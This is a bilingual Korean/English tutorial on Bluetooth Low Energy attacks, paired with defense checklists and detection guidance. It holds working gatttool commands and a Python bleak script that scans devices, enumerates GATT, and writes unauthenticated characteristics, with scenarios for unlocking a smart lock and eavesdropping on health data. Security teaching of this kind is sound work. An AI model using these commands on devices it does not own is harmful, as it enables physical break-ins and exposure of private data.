> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# BLE(저전력 블루투스) 공격 기법

## 0. 초보자를 위한 개념 이해

### BLE 공격이란?

BLE를 처음 배우는 분을 위한 비유: 스마트 자물쇠는 마치 **종이에 비밀번호를 써서 문앞에 붙여둔 것**과 같을 수 있습니다. 잠금을 여는 명령어가 BLE 특성(Characteristic)에 아무 인증 없이 노출되어 있다면, 근처에 있는 누구나 스마트폰으로 문을 열 수 있습니다.

```
BLE 취약점의 현실:

  스마트 자물쇠  → 인증 없이 GATT Write로 문 열기
  심박 센서      → 암호화 없이 건강 데이터 노출
  스마트 전구    → 제조사 앱 없이도 ON/OFF 제어
  의료 기기      → 패스키 없이 설정값 변경
  물류 태그      → 위치 정보 평문 브로드캐스트

  공통점: "블루투스 = 짧은 거리 = 안전"이라는 착각
```

---

## 1. BLE 아키텍처: GAP와 GATT

### GAP (Generic Access Profile): "어떻게 발견하나"

```
GAP 역할: BLE 기기가 자신을 광고(Advertise)하는 방식 정의

  광고(Advertising):
    기기 ──── Advertisement 패킷 ──→ 공중파
    (주소, 기기명, 지원 서비스 목록 포함)
    누구든 이 패킷을 수신할 수 있음!

  역할:
    Peripheral  = 광고하는 쪽 (스마트워치, 센서)
    Central     = 연결하는 쪽 (스마트폰, 노트북)
    Broadcaster = 광고만 함, 연결 안 받음 (비콘)
    Observer    = 광고 수신만 (스캐너)
```

### GATT (Generic Attribute Profile): "무엇을 주고받나"

```
GATT 구조 (데이터 저장소):

  서버 (Peripheral)
  └── Service (서비스, UUID로 식별)
      ├── Characteristic (특성, 실제 데이터)
      │   ├── Value (값: 심박수, 온도, 잠금 명령 등)
      │   ├── Properties (Read/Write/Notify/Indicate)
      │   └── Descriptor (단위, 설명 등)
      └── Characteristic 2
          └── ...

예시: 심박 서비스
  Service UUID: 0x180D (Heart Rate)
  Characteristic: 0x2A37 (Heart Rate Measurement)
    Properties: Notify
    Value: 0x04 72  → 박동수 114 bpm

예시: 스마트 자물쇠 (취약한 경우)
  Service UUID: 제조사 커스텀 (예: 12345678-...)
  Characteristic: "잠금 명령"
    Properties: Write (인증 없음!)
    Value: 0x01 → 열기, 0x00 → 닫기
```

---

## 2. GATT 특성 열거 (Enumeration)

### 왜 열거를 먼저 하나?

```
침투 테스트 단계:
  1. 스캔       → 주변 BLE 기기 발견
  2. 연결       → 대상 기기에 연결
  3. 열거       → 모든 서비스/특성 목록 파악
  4. 분석       → 쓰기 가능한 특성 중 인증 없는 것 찾기
  5. 공격       → 값 쓰기/읽기로 기기 제어
```

### CLI로 GATT 열거

```bash
# 설치
sudo apt install bluez

# 대상 기기의 MAC 주소 필요 (먼저 스캔)
sudo hcitool lescan
# → AA:BB:CC:DD:EE:FF  SmartLock-Pro

# gatttool로 모든 특성 열거
gatttool -b AA:BB:CC:DD:EE:FF --char-desc

# 특성 값 읽기 (핸들 0x000e 예시)
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x000e

# 값 쓰기 (핸들 0x0011에 0x01 쓰기)
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0011 -n 01
```

---

## 3. 실습: bleak로 BLE 기기 스캔 + GATT 열거 (Python 3.10+)

### 3-1. 환경 설치

```bash
# bleak 설치 (크로스플랫폼 BLE 라이브러리)
pip install bleak

# Linux에서는 블루투스 권한 필요
sudo setcap cap_net_raw,cap_net_admin+eip $(which python3)
# 또는 sudo 로 실행
```

### 3-2. BLE 스캐너 + GATT 열거 스크립트

```python
#!/usr/bin/env python3
"""
ble_scanner.py — BLE 기기 스캔 및 GATT 특성 열거
사용법:
  python3 ble_scanner.py --scan          # 주변 기기 스캔
  python3 ble_scanner.py --enumerate AA:BB:CC:DD:EE:FF  # GATT 열거
  python3 ble_scanner.py --read AA:BB:CC:DD:EE:FF --uuid 0x2A37  # 특성 읽기
"""

import asyncio
import argparse
import sys
from bleak import BleakScanner, BleakClient
from bleak.backends.device import BLEDevice
from bleak.backends.characteristic import BleakGATTCharacteristic


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="BLE 스캐너 및 GATT 분석기")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--scan", action="store_true", help="주변 BLE 기기 스캔")
    group.add_argument("--enumerate", metavar="ADDR", help="대상 기기의 GATT 서비스/특성 열거")
    group.add_argument("--read", metavar="ADDR", help="특정 특성 값 읽기 (--uuid 필요)")
    parser.add_argument("--uuid", type=str, help="읽을 특성의 UUID")
    parser.add_argument("--timeout", type=float, default=10.0, help="스캔 시간(초)")
    parser.add_argument("--write", type=str, help="특성에 쓸 16진수 값 (예: 01, 00)")
    return parser.parse_args()


async def scan_devices(timeout: float) -> None:
    """주변 BLE 기기 스캔"""
    print(f"[*] BLE 기기 스캔 중 ({timeout}초)...")
    devices: list[BLEDevice] = await BleakScanner.discover(timeout=timeout)

    if not devices:
        print("  [!] 발견된 기기 없음")
        return

    print(f"\n[+] {len(devices)}개 기기 발견:\n")
    print(f"  {'주소':<20} {'RSSI':>6}  이름")
    print(f"  {'-'*20} {'-'*6}  {'-'*30}")
    for dev in sorted(devices, key=lambda d: d.rssi or -999, reverse=True):
        name = dev.name or "(이름 없음)"
        rssi = dev.rssi if dev.rssi else "N/A"
        print(f"  {dev.address:<20} {str(rssi):>6}  {name}")


async def enumerate_gatt(address: str) -> None:
    """대상 기기의 GATT 서비스와 특성 열거"""
    print(f"[*] {address} 에 연결 중...")
    try:
        async with BleakClient(address, timeout=15.0) as client:
            if not client.is_connected:
                print("[!] 연결 실패")
                return
            print(f"[+] 연결 성공!\n")

            services = client.services
            for service in services:
                print(f"  [서비스] UUID: {service.uuid}")
                print(f"           설명: {service.description}")

                for char in service.characteristics:
                    props = ", ".join(char.properties)
                    print(f"    [특성] UUID: {char.uuid}")
                    print(f"            설명: {char.description}")
                    print(f"            핸들: 0x{char.handle:04X}")
                    print(f"            속성: {props}")

                    # Read 가능한 특성은 값 읽어보기
                    if "read" in char.properties:
                        try:
                            value = await client.read_gatt_char(char.uuid)
                            hex_val = value.hex()
                            # 출력 가능한 ASCII면 텍스트로도 표시
                            try:
                                text_val = value.decode("utf-8", errors="strict")
                                print(f"            현재 값: 0x{hex_val}  ('{text_val}')")
                            except UnicodeDecodeError:
                                print(f"            현재 값: 0x{hex_val}")
                        except Exception:
                            print(f"            현재 값: (읽기 실패)")

                    # Write 가능하고 인증이 없는 것 강조
                    if "write" in char.properties or "write-without-response" in char.properties:
                        print(f"            ⚠ 쓰기 가능! 인증 확인 필요")
                    print()
                print()
    except Exception as e:
        print(f"[!] 오류: {e}")
        print("    힌트: sudo 로 실행하거나 블루투스 동글 확인")


async def read_characteristic(address: str, uuid: str) -> None:
    """특정 특성 값 읽기"""
    print(f"[*] {address} 에 연결, 특성 {uuid} 읽기...")
    try:
        async with BleakClient(address, timeout=15.0) as client:
            value = await client.read_gatt_char(uuid)
            print(f"[+] 값 (hex): {value.hex()}")
            print(f"[+] 값 (bytes): {list(value)}")
            try:
                print(f"[+] 값 (UTF-8): {value.decode('utf-8')}")
            except UnicodeDecodeError:
                pass
    except Exception as e:
        print(f"[!] 오류: {e}")


async def write_characteristic(address: str, uuid: str, hex_value: str) -> None:
    """특성에 값 쓰기 (교육 목적: 자신 소유 기기에만 사용)"""
    data = bytes.fromhex(hex_value.replace("0x", "").replace(" ", ""))
    print(f"[*] {address} 의 {uuid} 에 {data.hex()} 쓰기...")
    try:
        async with BleakClient(address, timeout=15.0) as client:
            await client.write_gatt_char(uuid, data, response=True)
            print(f"[+] 쓰기 성공!")
    except Exception as e:
        print(f"[!] 쓰기 실패: {e}")


async def main_async(args: argparse.Namespace) -> None:
    if args.scan:
        await scan_devices(args.timeout)
    elif args.enumerate:
        await enumerate_gatt(args.enumerate)
    elif args.read:
        if not args.uuid:
            print("[!] --read 사용 시 --uuid 필요")
            sys.exit(1)
        if args.write:
            await write_characteristic(args.read, args.uuid, args.write)
        else:
            await read_characteristic(args.read, args.uuid)


def main() -> None:
    args = parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[*] 스캔 중단")
    print("\n[!] 교육 목적으로만 사용. 타인 기기 접근은 불법입니다.")


if __name__ == "__main__":
    main()
```

### 3-3. 실행 예시

```bash
# 1. 주변 BLE 기기 스캔
python3 ble_scanner.py --scan --timeout 15

# 예상 출력:
# [*] BLE 기기 스캔 중 (15.0초)...
# [+] 8개 기기 발견:
#
#   주소                  RSSI  이름
#   -------------------- ------  ------------------------------
#   AA:BB:CC:DD:EE:FF      -45  SmartLock-Pro
#   11:22:33:44:55:66      -67  Mi Band 6
#   ...

# 2. GATT 특성 열거
python3 ble_scanner.py --enumerate AA:BB:CC:DD:EE:FF

# 3. 특정 특성 읽기 (심박수 예시)
python3 ble_scanner.py --read 11:22:33:44:55:66 --uuid 0x2A37
```

---

## 4. 인증 없는 쓰기 공격 시나리오

### 시나리오 A: 스마트 자물쇠 취약점

```
공격 시나리오:
  1. hcitool lescan → "SmartLock-Pro AA:BB:CC:DD:EE:FF" 발견
  2. ble_scanner.py --enumerate 로 GATT 열거
  3. 잠금 제어 특성 발견:
     [특성] UUID: 12345678-1234-1234-1234-123456789abc
             속성: write-without-response
             ⚠ 쓰기 가능! 인증 확인 없음
  4. 값 0x01 쓰기 → 자물쇠 열림
  5. 값 0x00 쓰기 → 자물쇠 잠김

실제 취약 제품들:
  - 가격이 저렴한 스마트 자물쇠 (중국산 무명 브랜드)
  - 구형 BLE 지원 도어락
  - 기업용 스마트 캐비넷
```

### 시나리오 B: IoT 센서 데이터 노출

```
공격 시나리오:
  1. 공장/창고 입구 근처에서 BLE 스캔
  2. "TempSensor-01" 발견 (RSSI: -55)
  3. GATT 열거 → 온도/습도 특성 모두 READ 가능
  4. 암호화 없음 → 생산 라인 환경 데이터 실시간 수집
  5. 의도된 사용: 경쟁사가 제조 타이밍 파악에 악용 가능
```

### 시나리오 C: BLE 알림(Notification) 도청

```
공격 코드 개념 (교육용):

  # Notify 특성 구독 → 기기가 값 바뀔 때마다 자동 전송
  async def notification_handler(sender, data: bytearray):
      print(f"  알림 수신: {data.hex()}")

  await client.start_notify(char_uuid, notification_handler)
  await asyncio.sleep(30)  # 30초간 모든 알림 수집
  await client.stop_notify(char_uuid)

  활용:
  - 심박 데이터 실시간 수집
  - 걸음 수/위치 정보 추적
  - 잠금 해제 이벤트 감지
```

---

## 5. BLE 보안 수준 이해

```
BLE 페어링 보안 수준:

  ┌────────────────────┬──────────────┬────────────┐
  │ 방법               │ MitM 방어    │도청 방어   │
  ├────────────────────┼──────────────┼────────────┤
  │ Just Works         │ 없음         │ 약함       │
  │ Passkey Entry      │ 있음         │ 보통       │
  │ Numeric Comparison │ 있음         │ 있음       │
  │ OOB (NFC 등)       │ 있음         │ 강함       │
  └────────────────────┴──────────────┴────────────┘

  Security Level:
    Level 1 = 암호화 없음, 인증 없음  ← 취약점 온상
    Level 2 = 암호화 있음, 인증 없음
    Level 3 = 암호화 있음, 인증 있음 (Passkey)
    Level 4 = Level 3 + LE Secure Connections (ECDH)
```

---

## 6. 방어: 안전한 BLE 구현 체크리스트

```
개발자/제품 보안 점검표:

  ✓ 민감한 특성은 Security Level 3 이상 설정
  ✓ Write 특성에 반드시 인증 요구
  ✓ 페어링 방식: Just Works 사용 금지 (최소 Passkey)
  ✓ 연결 요청 로그 기록
  ✓ 알 수 없는 기기 자동 거부
  ✓ 펌웨어 업데이트 채널 서명 검증
  ✓ 민감 명령은 암호화된 채널에서만 허용
  ✓ Rate limiting: 짧은 시간 내 과도한 연결 시도 차단
```

---

<!-- detect-validate-71 -->
## 7. 공격 탐지와 방어 검증

6장의 체크리스트는 예방에 초점이 있습니다. 여기서는 **공격이 발생했을 때 주변기기(서버) 쪽에서 무엇이 보이는지**와 **방어가 실제로 막는지 검증하는 법**을 다룹니다.

| 공격 | 서버 측 관측 신호 | 탐지 방법 |
|---|---|---|
| GATT 열거 | 짧은 시간에 전 핸들 순차 read | 특성 접근 로깅 + read 빈도 임계 |
| 미인증 쓰기 | 본딩 없는 연결의 write 요청 | write 콜백에서 페어링 상태 확인 |
| 릴레이/중계 | RSSI·왕복지연 불일치 | 거리 바운딩, 응답 타임아웃 |
| 알림 도청 | 비정상 다중 구독(CCCD) | 구독 수·출처 모니터링 |

### 방어 검증 (직접 확인)

```python
# 주변기기 write 핸들러의 '본딩 없으면 거부'가 실제 동작하는지 검증하는 개념
def on_write(conn, handle: int, value: bytes) -> bool:
    """민감 핸들은 본딩(암호화된 연결)에서만 허용. 아니면 거부."""
    if handle in SENSITIVE_HANDLES and not conn.is_bonded:
        log.warning("unauthorized write to 0x%04x from %s", handle, conn.addr)
        return False  # 거부 → 시나리오 A(자물쇠)가 막힌다
    return True
```

> 검증 절차: 자신이 소유한 BLE 기기에 **본딩 없이** 민감 특성 write를 시도해 거부되는지 확인합니다. 거부 로그가 남고 상태가 바뀌지 않아야 방어가 유효합니다([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- KNOB·BLESA·스푸핑·리플레이 등 페어링/재연결 공격 — LESC·Numeric Comparison·주소 무작위화 강제로 방어. 검증: 레거시 페어링 다운그레이드가 실제 거부되는지 재현(소유기기)
- GATT 무인증 특성 노출로 명령주입 — 특성별 인증/암호화가 강제되는지 확인([[27_IoT_Hacking]])

---

<a name="english"></a>

# BLE (Bluetooth Low Energy) Attack Techniques

## 0. Beginner Concepts

### What Is a BLE Attack?

Imagine a smart lock as a **sticky note on your front door with the combination written on it**. If the unlock command is exposed in a BLE GATT characteristic with no authentication, anyone nearby with a phone can open your door.

```
BLE Vulnerability Reality:

  Smart Lock      → Open door via unauthenticated GATT Write
  Heart Monitor   → Health data exposed without encryption
  Smart Bulb      → Controllable without the official app
  Medical Device  → Settings changeable without a passkey
  Logistics Tag   → Location broadcast in plaintext
```

---

## 1. BLE Architecture: GAP and GATT

### GAP (Generic Access Profile) — "How is the device discovered?"

```
  Peripheral  = Advertises (smartwatch, sensor)
  Central     = Connects (smartphone, laptop)
  Broadcaster = Advertises only, no connection (beacon)
  Observer    = Listens only (scanner)

  Advertisement packets are visible to EVERYONE nearby.
```

### GATT (Generic Attribute Profile) — "What data is exchanged?"

```
  Server (Peripheral)
  └── Service (identified by UUID)
      ├── Characteristic (actual data)
      │   ├── Value (heart rate, temperature, lock command...)
      │   ├── Properties (Read/Write/Notify/Indicate)
      │   └── Descriptor (units, description)
      └── Characteristic 2
          └── ...
```

---

## 2. GATT Enumeration

```bash
# Discover nearby BLE devices
sudo hcitool lescan

# Enumerate all characteristics on target
gatttool -b AA:BB:CC:DD:EE:FF --char-desc

# Read a specific handle
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x000e

# Write to a handle (own device only)
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0011 -n 01
```

---

## 3. Lab: bleak BLE Scanner + GATT Enumerator (Python 3.10+)

### Setup

```bash
pip install bleak
# Run with sudo on Linux for BLE access
```

### Usage

```bash
# Scan nearby BLE devices
python3 ble_scanner.py --scan --timeout 15

# Enumerate GATT on target
python3 ble_scanner.py --enumerate AA:BB:CC:DD:EE:FF

# Read a specific characteristic
python3 ble_scanner.py --read AA:BB:CC:DD:EE:FF --uuid 0x2A37
```

See the Korean section for the complete Python 3.10+ script with type hints and full error handling.

---

## 4. Unauthenticated Write Attack Scenarios

### Scenario A: Smart Lock Vulnerability

```
1. hcitool lescan → finds "SmartLock-Pro AA:BB:CC:DD:EE:FF"
2. Enumerate GATT → finds lock control characteristic
3. Properties: write-without-response, NO authentication
4. Write 0x01 → lock opens
5. Write 0x00 → lock closes

Affected products: Cheap smart locks (no-name brands)
```

### Scenario B: IoT Sensor Data Exposure

```
1. Scan near factory entrance
2. Find "TempSensor-01"
3. GATT enumerate → temperature/humidity characteristics readable
4. No encryption → real-time production floor data available
5. Risk: competitor monitoring production timing
```

### Scenario C: BLE Notification Eavesdropping

```python
# Subscribe to Notify characteristics → receive every value change
async def handler(sender, data: bytearray):
    print(f"  Notification: {data.hex()}")

await client.start_notify(char_uuid, handler)
await asyncio.sleep(30)   # Collect 30 seconds of data
await client.stop_notify(char_uuid)
```

---

## 5. BLE Security Levels

```
┌────────────────────┬──────────────┬────────────┐
│ Method             │ MitM Defense │ Eavesdrop  │
├────────────────────┼──────────────┼────────────┤
│ Just Works         │ None         │ Weak       │
│ Passkey Entry      │ Yes          │ Moderate   │
│ Numeric Comparison │ Yes          │ Yes        │
│ OOB (NFC etc.)     │ Yes          │ Strong     │
└────────────────────┴──────────────┴────────────┘

Security Level 1 = No encryption, no auth ← vulnerability hotspot
Security Level 4 = Encryption + auth + LE Secure Connections (ECDH)
```

---

## 6. Defense Checklist for BLE Developers

```
✓ Sensitive characteristics require Security Level 3+
✓ All Write characteristics must enforce authentication
✓ Never use Just Works pairing — minimum: Passkey
✓ Log all connection attempts
✓ Auto-reject unrecognized devices
✓ Sign firmware update payloads
✓ Sensitive commands only on encrypted channels
✓ Rate-limit excessive connection attempts
```

## 7. Attack Detection and Defense Validation

Section 6's checklist focuses on prevention. Here we cover **what the peripheral (server) side sees when an attack occurs** and **how to verify the defense actually blocks it**.

| Attack | Server-side signal | Detection method |
|---|---|---|
| GATT enumeration | Sequential read of all handles in a short window | Characteristic access logging + read-rate threshold |
| Unauthenticated write | Write request on a non-bonded connection | Check pairing state in the write callback |
| Relay | RSSI / round-trip latency mismatch | Distance bounding, response timeout |
| Notification sniffing | Abnormal multiple subscriptions (CCCD) | Monitor subscription count and source |

### Defense validation (verify yourself)

```python
# Verify that the peripheral's 'reject if not bonded' rule actually fires
def on_write(conn, handle: int, value: bytes) -> bool:
    """Sensitive handles allowed only over a bonded (encrypted) link; else reject."""
    if handle in SENSITIVE_HANDLES and not conn.is_bonded:
        log.warning("unauthorized write to 0x%04x from %s", handle, conn.addr)
        return False  # rejected -> scenario A (smart lock) is blocked
    return True
```

> Validation: attempt a sensitive-characteristic write **without bonding** against a BLE device you own and confirm it is rejected. A reject log should appear and state must not change for the defense to be valid (see [[68_Purple_Team]]).
